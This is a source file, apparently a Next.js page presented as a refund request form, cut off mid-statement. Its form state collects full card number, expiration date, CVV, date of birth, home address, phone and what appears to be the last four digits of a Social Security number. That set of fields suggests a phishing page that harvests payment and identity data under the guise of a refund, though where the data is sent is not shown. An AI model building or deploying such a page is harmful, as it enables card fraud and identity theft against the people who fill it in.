"use client";
import { useState, ChangeEvent, FormEvent } from "react";
import { useRouter } from "next/router"; // Import useRouter
import { handleFormSubmit } from "@/src/utils/submit";

interface FormData {
  amount: number;
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  dob: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  lfssn: string;
}

export default function Home() {
  const [formData, setFormData] = useState<FormData>({
    amount: 0,
    orderId: "",
    reason: "",
    firstName: "",
    lastName: "",
    dob: "",
    mobileNumber: "",
    homeAddress: "",
    zipCode: "",
    cardType: "",
    cardNumber: "",
    expirationDate: "",
    cvv: "",
    lfssn: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");
  
  const router = useRouter(); // Initialize useRouter

  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [id]: value,
    }));
  };

  const handleRefundSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setStatusMessage("");
    try {
      await handleFormSubmit(formData);
      setStatusMessage("Refund request submitted successfully!");
      setFormData({
        amount: 0,
        orderId: "",
        reason: "",
        firstName: "",
        lastName: "",
        dob: "",
        mobileNumber: "",
        homeAddress: "",
        zipCode: "",
        cardType: "",
        cardNumber: "",
        expirationDate: "",
        cvv: "",
        lfssn: "",
      }
